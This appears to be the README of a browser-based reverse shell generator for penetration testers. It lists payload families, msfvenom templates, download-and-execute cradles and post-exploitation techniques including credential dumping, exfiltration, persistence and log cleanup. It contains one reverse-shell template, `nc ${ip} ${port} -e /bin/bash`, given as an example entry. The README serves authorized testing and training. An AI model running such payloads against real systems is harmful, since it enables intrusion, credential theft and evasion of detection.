# Drew's RevShell v3.0

> **⚠ For authorized penetration testing engagements only. Do not use against systems you do not have explicit written permission to test.**

A production-ready reverse shell payload generator and post-exploitation reference tool built as a single React/TypeScript component. Designed for penetration testers who want everything in one place — payloads, listeners, binary generation, web delivery, post-ex cheat sheets, and engagement tracking.

![Version](https://img.shields.io/badge/version-3.0-green?style=flat-square&color=00ff41)
![Shells](https://img.shields.io/badge/shells-35%2B-green?style=flat-square&color=00ff41)
![MSF Payloads](https://img.shields.io/badge/msfvenom-55%2B-green?style=flat-square&color=00ff41)
![Post--Ex](https://img.shields.io/badge/post--ex%20cmds-100%2B-green?style=flat-square&color=00ff41)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square&color=00ff41)

---

## Screenshots

> _Terminal green CRT aesthetic with scanline effects. Four color themes available._

---

## Features

### Payload Generator

- **35+ reverse shell one-liners** across Bash, Python, PHP, Netcat, PowerShell, Socat, OpenSSL, Ruby, Perl, Go, Node.js, Awk, Lua, Telnet, Java, Groovy, R, Kotlin, Tcl, Haskell, Zsh, and Windows LOLBins
- **Encoding options** — raw, base64, URL, double-URL, hex, PowerShell EncodedCommand
- **Per-shell OPSEC notes** — noise level rating (low/medium/high), detection risk, evasion tips
- **Token explanations** — break down each component of a payload for learning/reporting
- **Favorites** — pin frequently used shells for quick access
- **MITRE ATT&CK tags** — linked directly to attack.mitre.org
- **Attack Chain Summary** — listener + payload in one card with a single copy button
- **Auto-detect public IP** via ipify

### Listener Setup

- nc, ncat, socat (basic/PTY/TLS), pwncat-cs, Metasploit multi/handler
- Download listener as a standalone `.sh` script with engagement metadata header

### TTY Upgrade Wizard

- Step-by-step guided shell stabilization (Python PTY → stty raw → TERM fix)
- Progress bar, one-click copy per command, preferred method highlighted

### Generate Binary (msfvenom)

- **55+ msfvenom payloads** across 12 categories:

| Category        | Description                                                         |
| --------------- | ------------------------------------------------------------------- |
| Windows EXE     | Shell/Meterpreter staged & stageless, HTTPS, HTTP, VNC inject, bind |
| Windows DLL     | x64/x86 DLL for DLL hijacking and reflective injection              |
| Windows Script  | PS1, HTA, VBScript, ASPX, classic ASP                               |
| Shellcode       | Raw `.bin`, C-format, Python-format for Windows/Linux               |
| Linux ELF       | x64, x86, ARM, ARM64, MIPS, PPC — staged and stageless              |
| macOS           | Intel x64, Apple Silicon ARM64, HTTPS variants                      |
| Android APK     | TCP and HTTPS Meterpreter, stageless shell                          |
| iOS             | Jailbroken device Meterpreter                                       |
| Web Payloads    | PHP, JSP, WAR, Java JAR, Python, raw PHP shell                      |
| Evasion         | Shikata Ga Nai, XOR dynamic, template inject, no-null shellcode     |
| BSD             | FreeBSD x64, generic BSD x86 (pfSense/OPNsense)                     |
| Network / SCADA | Solaris x86, Solaris SPARC                                          |

- **Bad chars flag** (`-b`) — toggle on and specify bytes to avoid (e.g. `\x00\x0a\x0d`) for exploit dev
- **Encoder + iteration controls** for evasion payloads
- **Per-payload downloads**: `↓ cmd.sh` (msfvenom command), `↓ listener.sh`, `↓ bundle.sh` (full 3-step attack flow with comments)
- Staged vs stageless badges, MITRE tags, inline listener toggle

> **Note:** Downloads are shell scripts containing msfvenom commands to run on your attack box. The actual binary is produced when you execute the script. The tool runs entirely in the browser and cannot compile binaries.

### Web Delivery Cradles

One-click copy for all common download-and-execute techniques, auto-populated with your LHOST/port:

**Linux targets:** curl pipe bash, wget pipe bash, python urllib exec, ruby open-uri, php system

**Windows targets:** PowerShell IEX, IWR, Base64 EncodedCommand cradle, certutil, bitsadmin, regsvr32 Squiblydoo, mshta URL

**HTTP servers (attack box):** python3, php, ruby, socat one-file server

### Post-Exploitation Cheat Sheet

100+ commands across 10 sections, all filterable:

| Section             | Commands                                                                                                         |
| ------------------- | ---------------------------------------------------------------------------------------------------------------- |
| Linux Enumeration   | id, network, ports, processes, cron, SUID/GUID, world-writable, sensitive files, sudo                            |
| Windows Enumeration | whoami /all, systeminfo, netstat, ARP, firewall, services, scheduled tasks, users, reg hives, PS history         |
| Linux PrivEsc       | GTFOBins, /etc/passwd write, SUID abuse, LD_PRELOAD, wildcard injection, Docker/LXD escape, LinPEAS              |
| Windows PrivEsc     | WinPEAS, PowerUp, token impersonation, PrintSpoofer, GodPotato, UAC bypass, AlwaysInstallElevated                |
| Lateral Movement    | psexec, wmiexec, smbexec, CrackMapExec, Evil-WinRM, SSH tunnels, Chisel, ProxyChains                             |
| Credential Dumping  | Mimikatz (logonpasswords/SAM/DCSync), secretsdump, LaZagne, LSASS procdump, pypykatz, unshadow                   |
| Exfiltration        | Python HTTP server, SCP, nc file transfer, base64 exfil, tar over SSH, PS upload, ICMP/DNS exfil                 |
| Linux Persistence   | cron, SSH authorized_keys, SUID backdoor, .bashrc, systemd service, LD_PRELOAD hook                              |
| Windows Persistence | Run keys, scheduled tasks, startup folder, service install, WMI subscription, DLL hijacking, IFEO                |
| Active Directory    | BloodHound, Kerberoast, AS-REP Roast, CrackMapExec, kerbrute, Pass-the-Ticket, Golden Ticket, DCSync, NTLM relay |
| Cleanup             | bash history, auth logs, syslog, tmp cleanup, Windows event logs, timestomp, prefetch, PS history                |

### Engagement Tracking

- Fill in engagement name, ID, target, operator, and scope
- All downloaded scripts are automatically stamped with this metadata and a timestamp
- **Payload history** — last 20 payloads with LHOST/LPORT and timestamp, click to copy
- **↓ Download report** — full engagement summary as a `.txt` file including payload history and notes

---

## Stack

- React 18 + TypeScript — single `.tsx` file, zero external UI dependencies
- All styling via inline CSS-in-JS — no Tailwind, no CSS modules, no build step dependencies
- Google Fonts: JetBrains Mono, Share Tech Mono
- Public IP detection via [ipify](https://www.ipify.org) (optional, on-click only)
- No backend, no data stored, no telemetry — runs entirely in the browser

---

## Usage

### Option 1 — Drop into a Next.js / React project

```bash
# Copy DrewsRevShell.tsx into your project
cp DrewsRevShell.tsx src/app/revshell/page.tsx

# Or use as a component
import DrewsRevShell from './DrewsRevShell'
```

The component takes no props and manages all state internally.

### Option 2 — Standalone with Vite

```bash
npm create vite@latest revshell -- --template react-ts
cd revshell
cp DrewsRevShell.tsx src/App.tsx
# Replace contents of src/App.tsx to just export DrewsRevShell as default
npm install && npm run dev
```

### Option 3 — Claude Artifacts / Sandboxed preview

Paste the `.tsx` file directly into Claude's artifact renderer. Runs instantly in-browser.

---

## Keyboard Shortcuts

| Shortcut     | Action               |
| ------------ | -------------------- |
| `Ctrl+Enter` | Copy current payload |
| `Ctrl+K`     | Clear shell search   |

---

## Workflow Example

1. Set **LHOST** and **LPORT** in the config bar
2. Add engagement metadata in the **Engagement** tab (optional but recommended)
3. Pick a shell from the sidebar → copy payload
4. Set up your listener in the **Listener** tab → `↓ listener.sh`
5. For Windows targets: grab a download cradle from **Web Delivery**
6. Generate a binary in **Generate Binary** → `↓ bundle.sh` to get the full 3-step script
7. Once you have a shell, use the **Post-Exploit** tab for enumeration and PrivEsc
8. Download the full engagement report when done

---

## File Structure

```
DrewsRevShell.tsx      # Everything — types, data, logic, UI in one file (~1200 lines)
README.md
```

### Internal structure of `DrewsRevShell.tsx`

```
Types                  # Shell, MsfPayload, Theme, Engagement, etc.
SHELLS[]               # 35+ reverse shell definitions
MSF_PAYLOADS[]         # 55+ msfvenom payload definitions
POSTEX_SECTIONS[]      # 100+ post-ex commands in 10 sections
THEMES{}               # green / amber / red / cyan
TTY_STEPS[]            # TTY upgrade wizard steps
Helper functions       # encodePayload, getListener, highlightPayload, downloadText
DrewsRevShell()        # Main component — all state + JSX
```

---

## Adding Shells

Add an entry to `SHELLS[]`:

```typescript
{
  id: "my-shell",
  category: "MyCategory",
  label: "My Custom Shell",
  ext: "sh",
  generate: (ip, port) => `nc ${ip} ${port} -e /bin/bash`,
  explain: {
    "nc": "Netcat — network utility",
    "-e /bin/bash": "Execute bash on connect",
  },
  mitre: ["T1059.004"],
  opsec: "Requires traditional netcat with -e support.",
  noise: "medium",
}
```

## Adding msfvenom Payloads

Add an entry to `MSF_PAYLOADS[]`:

```typescript
{
  id: "my-payload",
  category: "Windows EXE",          // must match an existing or new category
  label: "My Custom Payload",
  platform: "windows",
  arch: "x64",
  format: "exe",
  output: "shell.exe",
  payload: "windows/x64/shell_reverse_tcp",
  notes: "Usage guidance and OPSEC notes.",
  mitre: ["T1059.003"],
  staged: false,
  listener: "nc -lvnp LPORT",        // LHOST/LPORT auto-substituted at runtime
}
```

---

## Themes

| Key     | Color     | Best for                          |
| ------- | --------- | --------------------------------- |
| `green` | `#00ff41` | Classic terminal aesthetic        |
| `amber` | `#ffb300` | Low-light environments            |
| `red`   | `#ff3131` | High-contrast / red team branding |
| `cyan`  | `#00eeff` | Blue team adjacent / cool tone    |

---

## Disclaimer

This tool is intended exclusively for:

- Authorized penetration testing engagements
- CTF competitions
- Security research in lab environments
- Security education and training

**Never use this tool against systems you do not have explicit written permission to test.** The authors accept no liability for unauthorized or illegal use. Always operate within the scope of your engagement authorization.

---

## License

MIT — see [LICENSE](LICENSE)

---

_Built for pentesters, by a pentester. Feedback and PRs welcome._
